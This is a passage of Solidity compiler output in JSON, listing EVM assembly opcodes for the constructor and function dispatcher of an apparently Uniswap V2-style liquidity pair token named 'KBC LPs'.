								},
								{
									"begin": 325,
									"end": 395,
									"name": "SSTORE"
								},
								{
									"begin": 325,
									"end": 395,
									"name": "PUSH",
									"value": "1"
								},
								{
									"begin": 1140,
									"end": 1165,
									"name": "PUSH",
									"value": "10"
								},
								{
									"begin": 1140,
									"end": 1165,
									"name": "SSTORE"
								},
								{
									"begin": 2685,
									"end": 2772,
									"name": "CALLVALUE"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "DUP1"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "ISZERO"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "PUSH [tag]",
									"value": "1"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "JUMPI"
								},
								{
									"begin": 30,
									"end": 31,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 27,
									"end": 28,
									"name": "DUP1"
								},
								{
									"begin": 20,
									"end": 32,
									"name": "REVERT"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "tag",
									"value": "1"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "JUMPDEST"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "POP"
								},
								{
									"begin": 1203,
									"end": 1336,
									"name": "PUSH",
									"value": "40"
								},
								{
									"begin": 1203,
									"end": 1336,
									"name": "MLOAD"
								},
								{
									"begin": 1107,
									"end": 1114,
									"name": "CHAINID"
								},
								{
									"begin": 1107,
									"end": 1114,
									"name": "SWAP1"
								},
								{
									"begin": 1203,
									"end": 1336,
									"name": "DUP1"
								},
								{
									"begin": 1203,
									"end": 1336,
									"name": "PUSH",
									"value": "52"
								},
								{
									"begin": 1203,
									"end": 1336,
									"name": "PUSH data",
									"value": "8B73C3C69BB8FE3D512ECC4CF759CC79239F7B179B0FFACAA9A75D522B39400F"
								},
								{
									"begin": 1203,
									"end": 1336,
									"name": "DUP3"
								},
								{
									"begin": 1203,
									"end": 1336,
									"name": "CODECOPY"
								},
								{
									"begin": 1203,
									"end": 1336,
									"name": "PUSH",
									"value": "40"
								},
								{
									"begin": 1203,
									"end": 1336,
									"name": "DUP1"
								},
								{
									"begin": 1203,
									"end": 1336,
									"name": "MLOAD"
								},
								{
									"begin": 1203,
									"end": 1336,
									"name": "SWAP2"
								},
								{
									"begin": 1203,
									"end": 1336,
									"name": "DUP3"
								},
								{
									"begin": 1203,
									"end": 1336,
									"name": "SWAP1"
								},
								{
									"begin": 1203,
									"end": 1336,
									"name": "SUB"
								},
								{
									"begin": 1203,
									"end": 1336,
									"name": "PUSH",
									"value": "52"
								},
								{
									"begin": 1203,
									"end": 1336,
									"name": "ADD"
								},
								{
									"begin": 1203,
									"end": 1336,
									"name": "DUP3"
								},
								{
									"begin": 1203,
									"end": 1336,
									"name": "KECCAK256"
								},
								{
									"begin": 1370,
									"end": 1374,
									"name": "DUP3"
								},
								{
									"begin": 1370,
									"end": 1374,
									"name": "DUP3"
								},
								{
									"begin": 1370,
									"end": 1374,
									"name": "ADD"
								},
								{
									"begin": 1370,
									"end": 1374,
									"name": "DUP3"
								},
								{
									"begin": 1370,
									"end": 1374,
									"name": "MSTORE"
								},
								{
									"begin": 1370,
									"end": 1374,
									"name": "PUSH",
									"value": "7"
								},
								{
									"begin": 1370,
									"end": 1374,
									"name": "DUP1"
								},
								{
									"begin": 1370,
									"end": 1374,
									"name": "DUP5"
								},
								{
									"begin": 1370,
									"end": 1374,
									"name": "MSTORE"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "PUSH",
									"value": "4B4243204C5073"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "PUSH",
									"value": "C8"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "SHL"
								},
								{
									"begin": 1370,
									"end": 1374,
									"name": "PUSH",
									"value": "20"
								},
								{
									"begin": 1370,
									"end": 1374,
									"name": "SWAP5"
								},
								{
									"begin": 1370,
									"end": 1374,
									"name": "DUP6"
								},
								{
									"begin": 1370,
									"end": 1374,
									"name": "ADD"
								},
								{
									"begin": 1370,
									"end": 1374,
									"name": "MSTORE"
								},
								{
									"begin": 1404,
									"end": 1414,
									"name": "DUP3"
								},
								{
									"begin": 1404,
									"end": 1414,
									"name": "MLOAD"
								},
								{
									"begin": 1404,
									"end": 1414,
									"name": "DUP1"
								},
								{
									"begin": 1404,
									"end": 1414,
									"name": "DUP5"
								},
								{
									"begin": 1404,
									"end": 1414,
									"name": "ADD"
								},
								{
									"begin": 1404,
									"end": 1414,
									"name": "DUP5"
								},
								{
									"begin": 1404,
									"end": 1414,
									"name": "MSTORE"
								},
								{
									"begin": 1404,
									"end": 1414,
									"name": "PUSH",
									"value": "1"
								},
								{
									"begin": 1404,
									"end": 1414,
									"name": "DUP2"
								},
								{
									"begin": 1404,
									"end": 1414,
									"name": "MSTORE"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "PUSH",
									"value": "31"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "PUSH",
									"value": "F8"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "SHL"
								},
								{
									"begin": 1404,
									"end": 1414,
									"name": "SWAP1"
								},
								{
									"begin": 1404,
									"end": 1414,
									"name": "DUP6"
								},
								{
									"begin": 1404,
									"end": 1414,
									"name": "ADD"
								},
								{
									"begin": 1404,
									"end": 1414,
									"name": "MSTORE"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "DUP3"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "MLOAD"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "DUP1"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "DUP6"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "ADD"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "SWAP3"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "SWAP1"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "SWAP3"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "MSTORE"
								},
								{
									"begin": 1354,
									"end": 1376,
									"name": "PUSH",
									"value": "6A36D39F32C2225411D16C8F56813B9117E6EB8BF3D2893C5FC62411565CFCFE"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "DUP3"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "DUP5"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "ADD"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "MSTORE"
								},
								{
									"begin": 1394,
									"end": 1415,
									"name": "PUSH",
									"value": "C89EFDAA54C0F20C7ADF612882DF0950F5A951637E0307CDCB4C672F298B8BC6"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "PUSH",
									"value": "60"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "DUP4"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "ADD"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "MSTORE"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "PUSH",
									"value": "80"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "DUP3"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "ADD"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "SWAP6"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "SWAP1"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "SWAP6"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "MSTORE"
								},
								{
									"begin": 1466,
									"end": 1470,
									"name": "ADDRESS"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "PUSH",
									"value": "A0"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "DUP1"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "DUP4"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "ADD"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "SWAP2"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "SWAP1"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "SWAP2"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "MSTORE"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "DUP3"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "MLOAD"
								},
								{
									"begin": 26,
									"end": 47,
									"name": "DUP1"
								},
								{
									"begin": 26,
									"end": 47,
									"name": "DUP4"
								},
								{
									"begin": 26,
									"end": 47,
									"name": "SUB"
								},
								{
									"begin": 22,
									"end": 54,
									"name": "SWAP1"
								},
								{
									"begin": 22,
									"end": 54,
									"name": "SWAP2"
								},
								{
									"begin": 22,
									"end": 54,
									"name": "ADD"
								},
								{
									"begin": 6,
									"end": 55,
									"name": "DUP2"
								},
								{
									"begin": 6,
									"end": 55,
									"name": "MSTORE"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "PUSH",
									"value": "C0"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "SWAP1"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "SWAP2"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "ADD"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "SWAP1"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "SWAP2"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "MSTORE"
								},
								{
									"begin": 1152,
									"end": 1495,
									"name": "DUP1"
								},
								{
									"begin": 1152,
									"end": 1495,
									"name": "MLOAD"
								},
								{
									"begin": 1152,
									"end": 1495,
									"name": "SWAP2"
								},
								{
									"begin": 1152,
									"end": 1495,
									"name": "ADD"
								},
								{
									"begin": 1152,
									"end": 1495,
									"name": "KECCAK256"
								},
								{
									"begin": 1133,
									"end": 1149,
									"name": "PUSH",
									"value": "4"
								},
								{
									"begin": 1133,
									"end": 1495,
									"name": "SSTORE"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "POP"
								},
								{
									"begin": 2716,
									"end": 2736,
									"name": "DUP1"
								},
								{
									"begin": 2716,
									"end": 2736,
									"name": "SLOAD"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "PUSH",
									"value": "1"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "PUSH",
									"value": "1"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "PUSH",
									"value": "A0"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "SHL"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "SUB"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "NOT"
								},
								{
									"begin": 2716,
									"end": 2736,
									"name": "SWAP1"
								},
								{
									"begin": 2716,
									"end": 2736,
									"name": "DUP2"
								},
								{
									"begin": 2716,
									"end": 2736,
									"name": "AND"
								},
								{
									"begin": 2726,
									"end": 2736,
									"name": "CALLER"
								},
								{
									"begin": 2716,
									"end": 2736,
									"name": "SWAP1"
								},
								{
									"begin": 2716,
									"end": 2736,
									"name": "DUP2"
								},
								{
									"begin": 2716,
									"end": 2736,
									"name": "OR"
								},
								{
									"begin": 2716,
									"end": 2736,
									"name": "SWAP1"
								},
								{
									"begin": 2716,
									"end": 2736,
									"name": "SWAP3"
								},
								{
									"begin": 2716,
									"end": 2736,
									"name": "SSTORE"
								},
								{
									"begin": 2747,
									"end": 2752,
									"name": "PUSH",
									"value": "F"
								},
								{
									"begin": 2747,
									"end": 2765,
									"name": "DUP1"
								},
								{
									"begin": 2747,
									"end": 2765,
									"name": "SLOAD"
								},
								{
									"begin": 2747,
									"end": 2765,
									"name": "SWAP1"
								},
								{
									"begin": 2747,
									"end": 2765,
									"name": "SWAP2"
								},
								{
									"begin": 2747,
									"end": 2765,
									"name": "AND"
								},
								{
									"begin": 2747,
									"end": 2765,
									"name": "SWAP1"
								},
								{
									"begin": 2747,
									"end": 2765,
									"name": "SWAP2"
								},
								{
									"begin": 2747,
									"end": 2765,
									"name": "OR"
								},
								{
									"begin": 2747,
									"end": 2765,
									"name": "SWAP1"
								},
								{
									"begin": 2747,
									"end": 2765,
									"name": "SSTORE"
								},
								{
									"begin": 226,
									"end": 18760,
									"name": "PUSH #[$]",
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 226,
									"end": 18760,
									"name": "DUP1"
								},
								{
									"begin": 226,
									"end": 18760,
									"name": "PUSH [$]",
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 226,
									"end": 18760,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 226,
									"end": 18760,
									"name": "CODECOPY"
								},
								{
									"begin": 226,
									"end": 18760,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 226,
									"end": 18760,
									"name": "RETURN"
								}
							],
							".data": {
								"0": {
									".auxdata": "a265627a7a72315820cf9089f787db5c2a6ca32ebe2dc67686be59ff857f8ac479e4a2edbca7aaf7c464736f6c63430005100032",
									".code": [
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH",
											"value": "80"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "MSTORE"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "CALLVALUE"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "POP"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "LT"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH [tag]",
											"value": "2"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "JUMPI"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "SHR"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "DUP1"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "GT"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH [tag]",
											"value": "36"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "JUMPI"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "DUP1"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH",
											"value": "BA9A7A56"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "GT"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH [tag]",
											"value": "37"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "JUMPI"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "DUP1"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH",
											"value": "D505ACCF"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "GT"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH [tag]",
											"value": "38"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "JUMPI"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "DUP1"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH",
											"value": "D505ACCF"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "EQ"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH [tag]",
											"value": "31"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "JUMPI"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "DUP1"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH",
											"value": "DCBBB373"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "EQ"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH [tag]",
											"value": "32"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "JUMPI"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "DUP1"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH",
											"value": "DD62ED3E"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "EQ"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH [tag]",
											"value": "33"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "JUMPI"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "DUP1"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH",
											"value": "F317739C"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "EQ"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH [tag]",
											"value": "34"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "JUMPI"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "DUP1"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH",
											"value": "FFF6CAE9"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "EQ"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH [tag]",
											"value": "35"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "JUMPI"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH [tag]",
											"value": "2"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "JUMP"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "tag",
											"value": "38"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "JUMPDEST"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "DUP1"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH",
											"value": "BA9A7A56"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "EQ"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH [tag]",
											"value": "27"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "JUMPI"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "DUP1"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH",
											"value": "BC25CF77"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "EQ"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH [tag]",
											"value": "28"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "JUMPI"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "DUP1"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH",
											"value": "C45A0155"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "EQ"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH [tag]",
											"value": "29"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "JUMPI"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "DUP1"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH",
											"value": "D21220A7"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "EQ"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH [tag]",
											"value": "30"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "JUMPI"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH [tag]",
											"value": "2"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "JUMP"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "tag",
											"value": "37"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "JUMPDEST"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "DUP1"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH",
											"value": "8DA5CB5B"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "GT"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH [tag]",
											"value": "39"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "JUMPI"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "DUP1"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH",
											"value": "8DA5CB5B"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "EQ"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH [tag]",
											"value": "23"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "JUMPI"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "DUP1"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH",
											"value": "900820D8"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "EQ"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH [tag]",
											"value": "24"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "JUMPI"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "DUP1"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH",
											"value": "95D89B41"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "EQ"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH [tag]",
											"value": "25"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "JUMPI"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "DUP1"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH",
											"value": "A9059CBB"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "EQ"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH [tag]",
											"value": "26"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "JUMPI"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH [tag]",
											"value": "2"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "JUMP"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "tag",
											"value": "39"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "JUMPDEST"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "DUP1"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "EQ"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH [tag]",
											"value": "19"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "JUMPI"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "DUP1"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH",
											"value": "7464FC3D"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "EQ"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH [tag]",
											"value": "20"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "JUMPI"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "DUP1"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH",
											"value": "7ECEBE00"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "EQ"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH [tag]",
											"value": "21"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "JUMPI"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "DUP1"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH",
											"value": "89AFCB44"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "EQ"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH [tag]",
											"value": "22"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "JUMPI"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH [tag]",
											"value": "2"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "JUMP"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "tag",
											"value": "36"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "JUMPDEST"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "DUP1"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH",
											"value": "30ADF81F"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "GT"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH [tag]",
											"value": "40"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "JUMPI"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "DUP1"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH",
											"value": "5909C0D5"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "GT"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH [tag]",
											"value": "41"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "JUMPI"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "DUP1"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH",
											"value": "5909C0D5"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "EQ"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH [tag]",
											"value": "15"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "JUMPI"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "DUP1"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH",
											"value": "5A3D5493"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "EQ"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH [tag]",
											"value": "16"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "JUMPI"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "DUP1"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH",
											"value": "6488F7B0"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "EQ"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH [tag]",
											"value": "17"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "JUMPI"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "DUP1"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH",
											"value": "6A627842"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "EQ"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH [tag]",
											"value": "18"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "JUMPI"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH [tag]",
											"value": "2"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "JUMP"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "tag",
											"value": "41"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "JUMPDEST"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "DUP1"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH",
											"value": "30ADF81F"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "EQ"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH [tag]",
											"value": "11"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "JUMPI"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "DUP1"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH",
											"value": "313CE567"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "EQ"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH [tag]",
											"value": "12"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "JUMPI"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "DUP1"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH",
											"value": "3644E515"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "EQ"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH [tag]",
											"value": "13"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "JUMPI"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "DUP1"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH",
											"value": "47D5D856"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "EQ"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH [tag]",
											"value": "14"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "JUMPI"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH [tag]",
											"value": "2"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "JUMP"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "tag",
											"value": "40"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "JUMPDEST"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "DUP1"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH",
											"value": "DFE1681"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "GT"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH [tag]",
											"value": "42"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "JUMPI"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "DUP1"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH",
											"value": "DFE1681"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "EQ"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH [tag]",
											"value": "7"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "JUMPI"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "DUP1"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH",
											"value": "1794BB3C"
										},
										{
											"begin": 226,
